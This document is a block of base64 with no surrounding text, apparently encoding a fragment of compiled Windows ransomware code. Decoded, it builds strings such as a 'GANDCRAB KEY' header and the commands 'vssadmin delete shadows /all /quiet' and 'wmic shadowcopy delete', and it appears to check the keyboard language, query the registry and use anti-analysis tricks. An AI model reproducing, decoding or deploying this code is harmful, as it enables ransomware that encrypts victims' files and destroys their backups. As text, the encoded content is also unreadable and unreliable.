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FC6FAEAAIsNiBICEOhaMQAAg8QMhcB1BINl/ABoAAEAAI1F9FCLRQwFBAEAAFC6FAEAAIsNiBICEOgtMQAAg8QMhcB1BINl/ABqIFqNTczo9FEAAGoIWo1N7OjpUQAAi0X8i+Vdw1WL7IHs+AAAAOgAAAAAPoMEJBF1BXQD6SgUWP/gAOmDZeAAgz2MEgIQAA+FLAUAAItFCIsABQQCAACJhSj///9qLVhmiYUs////ai1YZomFLv///2otWGaJhTD///9qQlhmiYUy////akVYZomFNP///2pHWGaJhTb///9qSVhmiYU4////ak5YZomFOv///2ogWGaJhTz///9qR1hmiYU+////akFYZomFQP///2pOWGaJhUL///9qRFhmiYVE////akNYZomFRv///2pSWGaJhUj///9qQVhmiYVK////akJYZomFTP///2ogWGaJhU7///9qS1hmiYVQ////akVYZomFUv///2pZWGaJhVT///9qLVhmiYVW////ai1YZomFWP///2otWGaJhVr///8zwGaJhVz///9qLVhmiYVg////ai1YZomFYv///2otWGaJhWT///9qRVhmiYVm////ak5YZomFaP///2pEWGaJhWr///9qIFhmiYVs////akdYZomFbv///2pBWGaJhXD///9qTlhmiYVy////akRYZomFdP///2pDWGaJhXb///9qUlhmiYV4////akFYZomFev///2pCWGaJhXz///9qIFhmiYV+////aktYZolFgGpFWGaJRYJqWVhmiUWEai1YZolFhmotWGaJRYhqLVhmiUWKM8BmiUWMi5Uo////i00I6KrN//+JReyLFYASAhCLDVwSAhDols3//4lF9IN97AAPhCQDAACDffQAD4QSAwAAi0XsiUXwi0XwQImFIP///4tF8IoAiEX9/0XwgH39AHXvi0XwK4Ug////iYUI////i0X0iUXki0XkQImFGP///4tF5IoAiEX//0XkgH3/AHXvi0XkK4UY////iYUQ////i4UQ////0eCLjQj///+NjEgAAQAA6DlPAACjjBICEIM9jBICEAAPhH4CAACNhSz///9Q/zWMEgIQ/xWYMQEQaAhzARD/NYwSAhD/FZwxARD/NYwSAhD/FcwxARCLDYwSAhCNBEGJRdyLReyJReiLRehAiYUU////i0Xoi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F3DVYvsgezMAAAA6AAAAAA+gwQkEXUFdAPpKBRY/+AA6YNl/ACDZfgAg2X0AOg5QAAAhcAPhPYAAABqXFhmiUW4andYZolFumpiWGaJRbxqZVhmiUW+am1YZolFwGpcWGaJRcJqd1hmiUXEam1YZolFxmppWGaJRchqY1hmiUXKai5YZolFzGplWGaJRc5qeFhmiUXQamVYZolF0jPAZolF1GpzWGaJRZRqaFhmiUWWamFYZolFmGpkWGaJRZpqb1hmiUWcandYZolFnmpjWGaJRaBqb1hmiUWianBYZolFpGp5WGaJRaZqIFhmiUWoamRYZolFqmplWGaJRaxqbFhmiUWuamVYZolFsGp0WGaJRbJqZVhmiUW0M8BmiUW2jUW4iUX4jUWUiUX06bcBAABqXFhmiUXYamNYZolF2mptWGaJRdxqZFhmiUXeai5YZolF4GplWGaJReJqeFhmiUXkamVYZolF5jPAZolF6GovWGaJhUT///9qY1hmiYVG////aiBYZomFSP///2p2WGaJhUr///9qc1hmiYVM////anNYZomFTv///2phWGaJhVD///9qZFhmiYVS////am1YZomFVP///2ppWGaJhVb///9qblhmiYVY////aiBYZomFWv///2pkWGaJhVz///9qZVhmiYVe////amxYZomFYP///2plWGaJhWL///9qdFhmiYVk////amVYZomFZv///2ogWGaJhWj///9qc1hmiYVq////amhYZomFbP///2phWGaJhW7///9qZFhmiYVw////am9YZomFcv///2p3WGaJhXT///9qc1hmiYV2////aiBYZomFeP///2ovWGaJhXr///9qYVhmiYV8////amxYZomFfv///2psWGaJRYBqIFhmiUWCai9YZolFhGpxWGaJRYZqdVhmiUWIamlYZolFimplWGaJRYxqdFhmiUWOM8BmiUWQjUXYiUX4jYVE////iUX0aAAEAACNjTT////oVQoAAGgAAgAAjY00////6IoKAACJRfyDffwAdRyDZewAi0XsiUXw602NjTT////oWQoAAItF7OtLaAABAAD/dfz/FawxARD/dfj/dfz/FZwxARBqAGoA/3X0/3X8aHx1ARBqAP8VUDIBEGogWTvIG8D32IlF8I2NNP///+gMCgAAi0Xwi+Vdw1WL7IPk+IPsbFNWM9tXi8OAsJC7ARAFQD0UAQAAcvFqH41EJBxo4HUBEFDolHAAAL4gdgEQiFwkQ418JBxqQI1EJEilU1BmpaSIXCQv6OJrAACDxBSNVCQcjUwkPGgAAQAA6JQbAACLRCQYg8QIvhQBAACJRCRQi0QkFIlEJFRqBGgAMAAAVlOJXCRoiVwkbP8VZDEBEFZQupC7ARCjiBICEI1MJEDozRsAAFlZX15bi+Vdw2g4dgEQagBoAAAQAP8VlDABEIXAdAtQ/xXQMQEQM8BAwzPAw1WL7IHsoAAAAOgAAAAAPoMEJBF1BXQD6SgUWP/gAOn/FXgxARBqAGoAagD/FWwxARD/FaQxARCD+Fd0CGoA/xWUMQEQ6JP///+FwHUj6MY7AACFwHQa6GM8AAA9ABAAAHcO6HHK//+FwHQF6E48AADoozsAAIXAdBnoQDwAAD0AEAAAdw3okwUAAGoA/xWUMQEQ6N/6//+FwHQN6G74//9qAP8VlDEBEOgl9v//hcB1CGoA/xWUMQEQ6Gr+//9olHMBEGoAaJxzARBqAWikcwEQagFouHMBEGoBaMhzARBqAWjccwEQagFo7HMBEGoBaPxzARBqAWgEdAEQagFoGHQBEGoBaCh0ARBqAY2NYP///+hs3v//jY1g////6CgqAACNjWD////oXigAAIlF9ItF9I2MAAIEAADosjcAAKNcEgIQgz1cEgIQAHUIagD/FZQxARD/NVwSAhCNjWD////oMCYAAGh8dgEQ/zVcEgIQ/xWcMQEQaIh2ARD/NVwSAhD/FZwxARBosHYBEP81XBICEP8VnDEBEGjEdgEQ/zVcEgIQ/xWcMQEQx0Xw8HYBEI1F8GjkdwEQ/zVcEgIQ/xWcMQEQaGR0ARD/NVwSAhD/FZwxARBo+HcBEP81XBICEP8VnDEBEP81XBICEP8VzDEBENHgo4ASAhD/NVwSAhD/FcwxARDR4IvQiw1cEgIQ6HcQAABqAf8ViDEBEGgsEgIQ/xVwMQEQaEQSAhD/FXAxARBoZBICEP8VcDEBEOg/8v//aGQSAhD/FagwARBoLBICEP8VqDABEGhEEgIQ/xWoMAEQ6Ef5///oUToAAD0AQAAAczeDZfgAaDAGAACNRfhQ6EA+AABZWYXAdB9qA/91+GoAahT/FWAyARBoAIAAAGoA/3X4/xXEMQEQagBqAGoAaEBpABBqAGoA/xW4MAEQiUX8g338AHULav//dfz/FYQxARCDffwAdAtq//91/P8VhDEBEI2NYP///+iAMAAAi+Vdw1WL7IHsqAYAAOgAAAAAPoMEJBF1BXQD6SgUWP/gAOlqJVhmiUW0andYZolFtmppWGaJRbhqblhmiUW6amRYZolFvGppWGaJRb5qclhmiUXAaiVYZolFwmpcWGaJRcRqc1hmiUXGanlYZolFyGpzWGaJRcpqdFhmiUXMamVYZolFzmptWGaJRdBqM1hmiUXSajJYZolF1GpcWGaJRdZqd1hmiUXYamJYZolF2mplWGaJRdxqbVhmiUXealxYZolF4Gp3WGaJReJqbVhmiUXkamlYZolF5mpjWGaJRegzwGaJRepo/wAAAI2FWP3//1CNRbRQ/xXAMAEQanBYZomFaP///2pyWGaJhWr///9qb1hmiYVs////amNYZomFbv///2plWGaJhXD///9qc1hmiYVy////anNYZomFdP///2ogWGaJhXb///9qY1hmiYV4////amFYZomFev///2psWGaJhXz///9qbFhmiYV+////aiBYZolFgGpjWGaJRYJqclhmiUWEamVYZolFhmphWGaJRYhqdFhmiUWKamVYZolFjGogWGaJRY5qIlhmiUWQamNYZolFkmptWGaJRZRqZFhmiUWWaiBYZolFmGovWGaJRZpqY1hmiUWcaiBYZolFnmpzWGaJRaBqdFhmiUWiamFYZolFpGpyWGaJRaZqdFhmiUWoaiBYZolFqmolWGaJRaxqc1hmiUWuaiJYZolFsDPAZolFsv91CI2FaP///1CNhVj5//9Q/xVwMgEQg8QMaj2NjVj////ouQMAAGo8jY1Y////6PEDAACJRfyLRfzHADwAAACLRfzHQARAAAAA/xWIMgEQi038iUEIanJYZolF7Gp1WGaJRe5qblhmiUXwamFYZolF8mpzWGaJRfQzwGaJRfaLRfyNTeyJSAyLRfyNjVj9//+JSBCLRfyNjVj5//+JSBSLRfyDYBgAi0X8g2AcAItF/INgIACDZfgA/3X8/xVUMgEQhcB0Imr/i0X8/3A4/xWEMQEQi0X8/3A4/xXQMQEQagD/FZQxARCLRfhAiUX4g334ZHLEjY1Y////6BQDAACL5V3DVYvsUegAAAAAPoMEJBF1BXQD6SgUWP/gAOm5AAgAAOivMgAAiUX8g338AHRNaAABAAD/dfxqAP8VYDEBEGgAAQAAi0X8BQAEAABQ/3X8/xWsMAEQhcB0EYtF/AUABAAAUOhx/P//WesJ/3X86Gb8//9Zi0386GoyAACL5V3DVYvsgeysAAAA6AAAAAA+gwQkEXUFdAPpKBRY/+AA6ceFVP///xR4ARDHhVj///8weAEQx4Vc////THgBEMeFYP///2x4ARDHhWT///+IeAEQx4Vo////oHgBEMeFbP///7R4ARDHhXD////MeAEQx4V0////6HgBEMeFeP///yB5ARDHhXz///88eQEQx0WAWHkBEMdFhIR5ARDHRYikeQEQx0WM1HkBEMdFkAB6ARDHRZQkegEQx0WYRHoBEMdFnGh6ARDHRaB8egEQx0WklHoBEMdFqLB6ARDHRazQegEQx0Ww6HoBEMdFtBB7ARDHRbgkewEQx0W8QHsBEMdFwFx7ARDHRcRwewEQx0XIiHsBEMdFzKB7ARDHRdC8ewEQx0XUPHkBEMdF2NB7ARDHRdzoewEQx0XgBHwBEMdF5CR8ARDHReg4fAEQx0XsUHwBEI1N8OjvCAAAg2X8AOsHi0X8QIlF/IN9/CdzSotF8IPAJFCLRfz/tIVU/////xWgMAEQhcB1LYtF8P9wCGoAagH/FWwxARCJRfiDffgAdBRqAP91+P8VaDEBEP91+P8V0DEBEOupjU3w6M4IAACFwHWXjU3w6M4IAACL5V3DVYvs6AAAAAA+gwQkEXUFdAPpKBRY/+AA6eibEgAA6A/+///ob/f//4M94BICEAB0C4sN4BICEOhcMAAAgz3oEgIQAHQLiw3oEgIQ6EgwAADohRMAAOhL8P//agD/FVwxARBdw1WL7P9NDHUdM8BQUFBorWEAEFBQ/xW4MAEQhcB0B1D/FdAxARAzwEBdwgwAVYvsi0UIVldqQIvxM/9oADAAAFBXiX4IiX4MiQb/FWQxARCJfgSJRgiJRgyLxl9eXcIEAGgAgAAAagD/cQj/FcQxARDDVYvsi9FWg3oIAHQZi3IEi00IA/E7MnMNi0IMA8iJSgyJcgTrAjPAXl3CBABVi+yD7CBpAf1DAwBWx0Xg3HwBEIvyx0Xk7HwBEMdF6AB9ARAFw54mAMdF7Ax9ARCJAcH4EIPgB8dF8Bx9ARDHRfQsfQEQx0X4OH0BEMdF/ER9ARD/dIXgVv8VmDEBEIvGXovlXcNVi+yD7ERTVovxx0W8TH0BEFfHRcBUfQEQi/rHRcRcfQEQaQb9QwMAx0XIZH0BEMdFzGx9ARDHRdB0fQEQx0XUfH0BEAXDniYAx0XYhH0BEIkGwfgQg+APx0XcjH0BEMdF4JR9ARDHReScfQEQx0XopH0BEMdF7Kx9ARDHRfC0fQEQx0X0vH0BEMdF+MR9ARD/dIW8V/8VmDEBEGkG/UMDALnDniYAx0X8BQAAADPbA8GJBsH4ECX/fwAAmfd9/EJ0PGkG/UMDAAPBiQbB+BCD4A//dIW8V/8VnDEBEGkG/UMDALnDniYAQwPBiQbB+BAl/38AAJn3ffxCO9pyxIvHX15bi+Vdw1WL7IHsnAwAAFNWV2pNWGpvZomFdP///4vxWGp6ZomFdv///1hqaVpqbGaJhXj///9YamFmiYV8////ZomFfv///1hqL2aJRYBYajVmiUWCWGouW2owZolFhFhqIFlqKGaJRYhYaldfam5miUWMWGpkZolFklhqb2aJRZRYandmiUWWWGpzZolFmFhqTmaJRZpYalRmiZV6////ZolVkFpqNmaJTYpmiU2cZolNollqMWaJRZ5YajtmiV2GZoldpltqIGaJRahYZol9jmaJVaBmiU2kZoldqmaJRax